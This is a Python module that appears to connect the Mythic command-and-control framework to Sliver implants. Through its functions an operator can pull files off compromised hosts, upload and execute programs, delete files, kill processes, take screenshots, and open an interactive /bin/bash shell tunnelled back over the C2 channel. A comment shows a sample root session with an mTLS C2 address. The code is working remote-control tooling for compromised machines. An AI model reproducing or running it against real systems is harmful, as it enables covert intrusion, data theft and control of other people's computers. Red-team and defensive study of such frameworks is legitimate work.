import asyncio
from mythic_container.MythicCommandBase import PTTaskMessageAllData
from mythic_container.MythicRPC import SendMythicRPCFileGetContent, MythicRPCFileGetContentMessage
from sliver import SliverClientConfig, SliverClient, client_pb2, sliver_pb2
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.PayloadBuilder import *
import json
import gzip
from mythic_container.LoggingBase import *
from mythic_container.MythicGoRPC import *

# TODO: make this better, if using identify all fields that will be used / handle emptying when exiting
global_dict = {
    'sliver_clients': {}
}

async def create_sliver_interact(taskData: PTTaskMessageAllData):
    # check to see if its cached
    if (f"{taskData.Callback.ID}" in global_dict['sliver_clients'].keys()):
        return global_dict['sliver_clients'][f"{taskData.Callback.ID}"]['interact'], global_dict['sliver_clients'][f"{taskData.Callback.ID}"]['isBeacon']

    extraInfoObj = json.loads(taskData.Callback.ExtraInfo)
    configfile = extraInfoObj['slivercfg_fileid']

    # otherwise get it
    filecontent = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=configfile
    ))

    config = SliverClientConfig.parse_config(filecontent.Content)
    client = SliverClient(config)
    await client.connect()

    callback_extra_info = json.loads(taskData.Callback.ExtraInfo)
    isBeacon = callback_extra_info['type'] == 'beacon'
    if (isBeacon):
        interact = await client.interact_beacon(taskData.Payload.UUID)
    else:
        interact = await client.interact_session(taskData.Payload.UUID)

    # cache it for later
    # TODO: memory leak if this never gets removed? (why useful to implement 'exit' command)
    global_dict['sliver_clients'][f"{taskData.Callback.ID}"] = {
        'interact': interact,
        'isBeacon': isBeacon
    }

    return interact, isBeacon

async def generate():
    # TODO: generate an implant based on config provided

    # implant_config = client_pb2.ImplantConfig(
    #     IsBeacon=True,
    #     Name="sliver-pytest-1",
    #     GOARCH="amd64",
    #     GOOS="linux",
    #     Format=client_pb2.OutputFormat.EXECUTABLE,
    #     ObfuscateSymbols=False,
    #     C2=[client_pb2.ImplantC2(Priority=0, URL="http://localhost:80")],
    # )

    # implant = await client.generate_implant(implant_config)

    return None

async def ifconfig(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    ifconfig_results = await interact.ifconfig()

    if (isBeacon):
        ifconfig_results = await ifconfig_results

    return ifconfig_results

async def info(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    #             Session ID: d7e28b37-88be-44f9-ba31-8913bf535d1a
    #               Name: FUNNY_DRIVEWAY
    #           Hostname: ubuntu
    #               UUID: c744e366-d14c-4bf3-94c3-558012eda8a1
    #           Username: root
    #                UID: 0
    #                GID: 0
    #                PID: 120952
    #                 OS: linux
    #            Version: Linux ubuntu 6.5.0-27-generic
    #             Locale: en-US
    #               Arch: amd64
    #          Active C2: mtls://192.168.17.129:443
    #     Remote Address: 192.168.17.129:50072
    #          Proxy URL: 
    # Reconnect Interval: 1m0s
    #      First Contact: Fri Apr 12 21:11:25 CDT 2024 (28m16s ago)
    #       Last Checkin: Fri Apr 12 21:39:39 CDT 2024 (2s ago)

    responseString = []
    responseString.append(f"Session Id: {interact.session_id}")
    responseString.append(f"Name: {interact.name}")
    responseString.append(f"Hostname: {interact.hostname}")
    responseString.append(f"UUID: {interact.uuid}")
    responseString.append(f"Username: {interact.username}")
    responseString.append(f"UID: {interact.uid}")
    responseString.append(f"GID: {interact.gid}")
    responseString.append(f"PID: {interact.pid}")
    responseString.append(f"OS: {interact.os}")
    responseString.append(f"Version: {interact.version}")
    # responseString.append(f"Locale: {interact.L}")
    responseString.append(f"Arch: {interact.arch}")
    responseString.append(f"Active C2: {interact.active_c2}")
    responseString.append(f"Remote Address: {interact.remote_address}")
    responseString.append(f"Proxy URL: {interact.proxy_url}")
    responseString.append(f"Reconnect Interval: {interact.reconnect_interval}")
    # responseString.append(f"First Contact: {interact.last_checkin}")
    responseString.append(f"Last Checkin: {interact.last_checkin}")

    finalResponse = "\n".join(responseString)

    return finalResponse

async def ping(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)
    ping_result = await interact.ping()

    if (isBeacon):
        ping_result = await ping_result

    return f"{ping_result}"

async def screenshot(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)
    screenshot_result = await interact.screenshot()

    if (isBeacon):
        screenshot_result = await screenshot_result

    # decompressed = gzip.decompress(screenshot_result.Data)

    return screenshot_result.Data

async def whoami(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    # TODO: this is special for windows

    return f"Logon ID: {interact.username}"

async def getgid(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)
    return f"{interact.gid}"

async def getpid(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)
    return f"{interact.pid}"

async def getuid(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)
    return f"{interact.uid}"

async def download(taskData: PTTaskMessageAllData, full_path: str):
    interact, isBeacon = await create_sliver_interact(taskData)

    download_results = await interact.download(remote_path=full_path)

    if (isBeacon):
        download_results = await download_results

    plaintext = gzip.decompress(download_results.Data)

    return plaintext

async def upload(taskData: PTTaskMessageAllData, agent_file_uuid: str, path: str):
    interact, isBeacon = await create_sliver_interact(taskData)

    filestuff = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=agent_file_uuid
    ))

    upload_results = await interact.upload(
        remote_path=path,
        data=filestuff.Content
    )

    if (isBeacon):
        upload_results = await upload_results     

    return upload_results

async def rm(taskData: PTTaskMessageAllData, path_to_rm: str):
    interact, isBeacon = await create_sliver_interact(taskData)

    rm_results = await interact.rm(remote_path=path_to_rm)
    
    if (isBeacon):
        rm_results = await rm_results

    return rm_results

async def ls(taskData: PTTaskMessageAllData, path_to_ls: str):
    interact, isBeacon = await create_sliver_interact(taskData)

    ls_results = await interact.ls(remote_path=path_to_ls)

    if (isBeacon):
        ls_results = await ls_results
        
    return ls_results

async def ps(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    ps_results = await interact.ps()

    if (isBeacon):
        ps_results = await ps_results

    return ps_results

async def netstat(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    netstat_results = await interact.netstat(tcp=True, udp=True, ipv4=True, ipv6=True, listening=True)

    if (isBeacon):
        netstat_results = await netstat_results

    return netstat_results

async def cd(taskData: PTTaskMessageAllData, remote_path: str):
    interact, isBeacon = await create_sliver_interact(taskData)

    cd_results = await interact.cd(remote_path=remote_path)

    if (isBeacon):
        cd_results = await cd_results
    
    return f"{cd_results}"

async def execute(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    # TODO: get these from function parameters and extract in the parent function instead
    exe = taskData.args.get_arg('exe')
    args = taskData.args.get_arg('args')
    output = taskData.args.get_arg('output')

    execute_results = await interact.execute(exe=exe, args=args, output=output)

    if (isBeacon):
        execute_results = await execute_results

    return execute_results

async def mkdir(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    # TODO: get these from function parameters and extract in the parent function instead
    remote_path = taskData.args.get_arg('path')

    mkdir_results = await interact.mkdir(remote_path=remote_path)

    if (isBeacon):
        mkdir_results = await mkdir_results

    return mkdir_results

async def pwd(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    pwd_results = await interact.pwd()

    if (isBeacon):
        pwd_results = await pwd_results

    return f"{pwd_results}"

async def terminate(taskData: PTTaskMessageAllData, pid: int):
    interact, isBeacon = await create_sliver_interact(taskData)

    terminate_results = await interact.terminate(pid=pid)

    if (isBeacon):
        terminate_results = await terminate_results

    return f"{terminate_results}"

async def shell(taskData: PTTaskMessageAllData):
    interact, isBeacon = await create_sliver_interact(taskData)

    # TODO: make a different beacon payload with that command not listed? (or take this command out manually with rpc?)
    if (isBeacon):
        return None # TODO: throw error and more gracefully handle with (not supported for beacons)
    
    # typed as rpcpb.SliverRPCClient in TS 
    # but here is 'SliverRPCStub' type (python)
    # (confirmed in pwd code which is working)
    _rpc = interact._stub # doing this to match the this._rpc in the client.ts
    request = interact._request # helper function?
    _tunnelStream = _rpc.TunnelData() # line 622 in client.ts (in the connect() function)

    global_dict['interact'] = interact 
    global_dict['tunnel_stream'] = _tunnelStream
    
    tunnel = sliver_pb2.Tunnel(SessionID=interact.session_id) # line 461/462 client.ts
    rpcTunnel = await _rpc.CreateTunnel(tunnel) # line 464

    tunnelId = rpcTunnel.TunnelID # line 468 in client.ts
    tunnelData = sliver_pb2.TunnelData() # line 469 in client.ts
    tunnelData.TunnelID = tunnelId
    tunnelData.SessionID = interact.session_id
    await _tunnelStream.write(tunnelData) # bind tunnel? (line 519 client.ts and tunnels.go#L128)

    global_dict['tunnel_id'] = tunnelId
    global_dict['session_id'] = interact.session_id

    req = sliver_pb2.ShellReq() # line 474 in client.ts
    req.TunnelID = tunnelId
    req.Path = "/bin/bash"
    req.EnablePTY = True
    shell_result = await _rpc.Shell(request(req)) # line 479 in client.ts
    # TODO: send shell_result output to the task, to show which pid it has created / bound to

    async def read_server_data():
        async for data in _tunnelStream:
            await MythicRPC().execute("create_output", task_id=taskData.Task.ID, output=f'{data.Data.decode("utf-8")}\n')

    # TODO: don't let this run forever, keep track of it and stop it when 'exit' or something is called
    asyncio.create_task(read_server_data())

    return tunnel

# TODO: move this somewhere else? (shell functionality might be its own file by this point...)
class MyLogger(Log):
    async def new_task(self, msg: LoggingMessage) -> None:
        if (not msg.Data.IsInteractiveTask):
            return

        # TODO: prevent follow up tasks after 'exit'

        # logger.info(msg)

        if msg.Data.DisplayParams == '':
            return
        
        # TODO: check if for this session / task, etc...

        interact = global_dict['interact']
        _tunnelStream = global_dict['tunnel_stream']
        tunnelId = global_dict['tunnel_id']
        sessionId = global_dict['session_id']

        if msg.Data.DisplayParams == 'exit\n':
            closeReq = client_pb2.CloseTunnelReq(TunnelID=tunnelId)
            await interact._stub.CloseTunnel(interact._request(closeReq))
            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                TaskID=msg.Data.ID,
                UpdateCompleted=True,
                UpdateStatus="finished",
            ))
            return


        data = sliver_pb2.TunnelData()
        data.TunnelID = tunnelId
        data.SessionID = sessionId

        # TODO: get control characters from InteractiveMessageType
        if msg.Data.InteractiveTaskType != 0:
            data.Data = InteractiveMessageType[msg.Data.InteractiveTaskType][1].to_bytes()
        else:
            data.Data = f"{msg.Data.DisplayParams}".encode('utf-8')
        await _tunnelStream.write(data)
        
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=msg.Data.ID,
            UpdateCompleted=True,
            UpdateStatus="success",
        ))

